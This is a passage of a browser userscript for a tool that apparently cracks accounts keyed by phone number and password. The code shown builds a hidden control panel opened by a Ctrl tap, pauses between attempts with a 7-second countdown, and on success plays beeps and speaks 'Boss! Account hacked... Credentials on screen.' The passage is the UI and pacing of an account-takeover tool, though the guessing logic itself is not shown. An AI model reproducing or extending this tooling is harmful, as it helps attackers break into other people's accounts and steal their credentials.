    const PANEL_INPUT_IDS = ['ci', 'pi', 'pwi', 'ni', 'li', 'sdi'];

    function togglePanel() {
        const d = document.getElementById('fbx');
        if (!d) { createPanel(); return; }
        panelHidden = !panelHidden;
        d.style.display = panelHidden ? 'none' : 'flex';
    }

    function isPanelInputFocused() {
        const ae = document.activeElement;
        if (!ae) return false;
        if (PANEL_INPUT_IDS.includes(ae.id)) return true;
        if (ae.closest && ae.closest('#fbx')) return true;
        return false;
    }

    function installCtrlListener() {
        if (window.__fbCtrlInstalled) return;
        window.__fbCtrlInstalled = true;
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Control') { if (!ctrlDown) { ctrlDown = true; ctrlAlone = true; } } else if (ctrlDown) { ctrlAlone = false; }
        }, true);
        document.addEventListener('keyup', (e) => {
            if (e.key === 'Control') {
                const tapAlone = ctrlAlone;
                ctrlDown = false;
                ctrlAlone = false;
                if (!tapAlone) return;
                if (isPanelInputFocused()) return;
                togglePanel();
            }
        }, true);
    }

    // ============================================================
    // 4. 7-SECOND COUNTDOWN
    // ============================================================
    function startCountdown7(phone) {
        paused = true;
        const numbers = [7, 6, 5, 4, 3, 2, 1];
        let index = 0;
        log('⏳ Countdown Cooldown: 7 6 5 4 3 2 1', '#ff0');
        const statusText = document.getElementById('statusText');
        const statusDot = document.getElementById('statusDot');
        if (statusText) statusText.textContent = 'PAUSED';
        if (statusDot) statusDot.style.color = '#ff0';

        if (voiceEnabled) { 
            try { 
                const u = new SpeechSynthesisUtterance('7 6 5 4 3 2 1'); 
                u.rate = 0.75; 
                speechSynthesis.speak(u); 
            } catch (_) {} 
        }

        const cdDiv = document.createElement('div');
        cdDiv.id = 'countdown-display';
        cdDiv.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#000;color:#00ff66;z-index:2147483647;font:60px monospace;padding:30px 50px;border:2px solid #00ff66;border-radius:16px;box-shadow:0 0 60px rgba(0,255,102,0.6);text-align:center;';
        cdDiv.innerHTML = '<div style="font-size:16px;color:#ffbb00;margin-bottom:8px;">⏳ COOLDOWN RESUMING</div><div id="cd-number" style="font-size:90px;font-weight:bold;color:#00ff66;">7</div><div style="font-size:12px;color:#aaa;margin-top:8px;">📞 ' + phone + '</div>';
        safeAppend(cdDiv);

        const interval = setInterval(() => {
            index++;
            if (index < numbers.length) { 
                const elNum = document.getElementById('cd-number'); 
                if (elNum) elNum.textContent = String(numbers[index]); 
            }
            else {
                clearInterval(interval);
                const el = document.getElementById('countdown-display');
                if (el) el.remove();
                log('▶️ RESUMING...', '#00ff66');
                pendingCountdown = false;
                _GM_setValue('pendingCountdown', false);
                paused = false;
                if (statusText) statusText.textContent = 'RUNNING';
                if (statusDot) statusDot.style.color = '#00ff66';
            }
        }, 1000);
    }

    // ============================================================
    // 5. VOICE MESSAGE ("Boss! Account hacked...")
    // ============================================================
    function speakSuccess(phone, password) {
        if (!voiceEnabled) return;

        try {
            let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            let osc = audioCtx.createOscillator();
            let gain = audioCtx.createGain();
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.frequency.value = 800;
            osc.type = 'square';
            gain.gain.value = 0.1;
            osc.start();
            osc.stop(audioCtx.currentTime + 0.15);
            setTimeout(() => {
                let osc2 = audioCtx.createOscillator();
                let gain2 = audioCtx.createGain();
                osc2.connect(gain2);
                gain2.connect(audioCtx.destination);
                osc2.frequency.value = 1200;
                osc2.type = 'square';
                gain2.gain.value = 0.1;
                osc2.start();
                osc2.stop(audioCtx.currentTime + 0.15);
            }, 200);
        } catch(e) {}

        let elapsed = Math.floor((Date.now() - startTime) / 1000);
        let hrs = Math.floor(elapsed / 3600);
        let mins = Math.floor((elapsed % 3600) / 60);
        let secs = elapsed % 60;
        let country = getCountryName(COUNTRY_CODE);

        let msg = `Boss! Account hacked. Time: ${hrs} hours ${mins} minutes ${secs} seconds. Country: ${country}. Credentials on screen. Please create a profile on your browser or log out here and continue.`;

        setTimeout(() => {
            let utterance = new SpeechSynthesisUtterance(msg);
            utterance.rate = 0.85;
            utterance.pitch = 0.75;
            utterance.volume = 1;
            let voices = speechSynthesis.getVoices();
            let deep = voices.find(v => v.name.includes('Male') || v.name.includes('Daniel') || v.name.includes('Google UK English Male'));
            if (deep) utterance.voice = deep;
            speechSynthesis.speak(utterance);
        }, 500);
    }

